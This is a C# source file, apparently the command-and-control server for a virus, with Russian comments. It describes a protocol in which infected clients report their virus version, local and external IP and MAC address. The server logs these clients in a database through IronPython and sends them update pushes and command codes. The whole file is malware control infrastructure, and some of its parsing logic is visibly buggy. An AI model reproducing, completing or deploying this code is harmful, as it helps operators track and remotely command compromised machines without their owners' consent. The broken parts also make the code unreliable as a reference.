using IronPython.Hosting;
using Microsoft.Scripting.Hosting;
using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

/*
 Комманды:
0. Комманд нету
1. убить процесс себя
 */
/*
 Ошибки:
1.1 Запустить программу с обновлением
1.2 Не получилось из сообщения достать размер файла
1.3 Не получилось убить процесс себя
 */
/*
 Комманды от сервака:
U. Обнова и далее размер файла
C. Комманда, далее код комманды
 */

/*
 Комманды от себя:
V. версия вируса
I. локальный IP
O. внешний IP
M. Мак адрес
 */

namespace MainControllPannel
{
    class TcpServer
    {
        public IPAddress give_locale_ip()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var locale_ip in host.AddressList)
            {
                if (locale_ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return locale_ip;
                }
                return null;
            }
            return null;
        }

        public Socket StartServer()
        {
            IPAddress ip = IPAddress.Parse("127.0.0.1") /*give_locale_ip()*/;

            int port = 49001;

            IPEndPoint tcpEndPoint = new IPEndPoint(ip, port);

            var tcpSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            tcpSocket.Bind(tcpEndPoint);

            tcpSocket.Listen(100);
            Console.WriteLine("Сервер запущен\n");
            return tcpSocket;
        }

        /*public void SendUpgrade(string @programm, Socket tcpSocket)
        {
            var listener = tcpSocket.Accept();
            var buffer = new byte[256];
            //var size = 0;
            var data = new StringBuilder();

            //do
            //{
            //    size = listener.Receive(buffer);
            //    data.Append(Encoding.UTF8.GetString(buffer, 0, size));
            //} while (listener.Available > 0);

            FileInfo file = new FileInfo(programm);
            long lenght = file.Length;

            //Console.WriteLine(Convert.ToString(data));

            listener.Send(Encoding.UTF8.GetBytes(Convert.ToString(lenght)));

            Thread.Sleep(3000);

            var answer = File.ReadAllBytes(programm);

            listener.Send(answer);

            listener.Shutdown(SocketShutdown.Both);

            listener.Close();
        }
        */

        public void CheckAnswers(Socket tcpSocket, string @road_to_apdate)
        {
            while(true)
            {
                int version = 0;
                string locale_ip = "", global_ip = "", mac = "";
                var listener = tcpSocket.Accept();
                var buffer = new byte[256];
                var size = 0;
                var data = new StringBuilder();

                do
                {
                    size = listener.Receive(buffer);
                    data.Append(Encoding.UTF8.GetString(buffer, 0, size));
                } while (listener.Available > 0);

                for (int i = 0; i < data.Length; i++)
                {
                    switch (data[i])
                    {
                        case 'V':
                            string version_str = "";
                            for (int j = i + 1; data[j] != 'I'; j++)
                            {
                                version_str += data[j];
                                i = j - 1;
                            }
                            try
                            {
                                version = Convert.ToInt32(version_str);
                            }
                            catch (Exception)
                            {
                                Console.WriteLine("Не получилось преобразовать версию в int".ToString());
                                throw;
                            }
                            break;
                        case 'I':
                            string locale_ip_str = "";
                            for (int j = i + 1; data[j] != 'O'; j++)
                            {
                                locale_ip_str += data[j];
                                i = j - 1;
                            }
                            locale_ip = locale_ip_str;
                            break;
                        case 'O':
                            string global_ip_str = "";
                            for (int j = i + 1; data[j] != 'M'; j++)
                            {
                                global_ip_str += data[j];
                                i = j - i;
                            }
                            global_ip = global_ip_str;
                            break;
                        case 'M':
                            string mac_now = "";
                            for (int j = i + 1; j < i + 13; j++)
                            {
                                mac_now += data[j];
                            }
                            mac = mac_now;
                            break;
                        default:
                            break;
                    }
                    Microsoft.Scripting.Hosting.ScriptEngine engine = Python.CreateEngine();
                    ScriptScope scope = engine.CreateScope();
                    engine.ExecuteFile(@"C:\database.py", scope);
                    dynamic create = scope.GetVariable("create");
                    dynamic json_write = scope.GetVariable("json_write");
                    dynamic json_check = scope.GetVariable("json_check");
                    dynamic json_correct = scope.GetVariable("json_correct");
                    dynamic json_check_commands = scope.GetVariable("json_check_commands");
                    create();
                    if (json_check(mac))
                    {
                        while (json_check_commands(mac))
                        {
                            string command = json_check_commands(mac).ToString();
                            switch (command[0])
                            {
                                case 'U':
                                    FileInfo file = new FileInfo(@road_to_apdate);
                                    long lenght = file.Length;
                                    string message = "U" + lenght.ToString();
                                    var data_answerU = Encoding.UTF8.GetBytes(message);
                                    listener.Send(data_answerU);
                                    break;
                                case 'C':
                                    var data_answerC = Encoding.UTF8.GetBytes(command.ToString());
                                    listener.Send(data_answerC);
                                    break;
                                default:
                                    break;
                            }
                        }
                    }
                    else
                    {
                        json_write(version, locale_ip, global_ip, mac);
                        var data_answerELSE = Encoding.UTF8.GetBytes("C0");
                        listener.Send(data_answerELSE);
                    }
                }
                listener.Shutdown(SocketShutdown.Both);
                listener.Close();
            }
        }

        public void SetCommand(string mac_str, string task)
        {
            ScriptEngine engine = Python.CreateEngine();
            ScriptScope scope = engine.CreateScope();
            engine.ExecuteFile(@"C:\database.py", scope);
            dynamic create = scope.GetVariable("create");
            dynamic json_create_command = scope.GetVariable("json_create_command");
            create();
            json_create_command(mac_str, task);
        }
    }
}
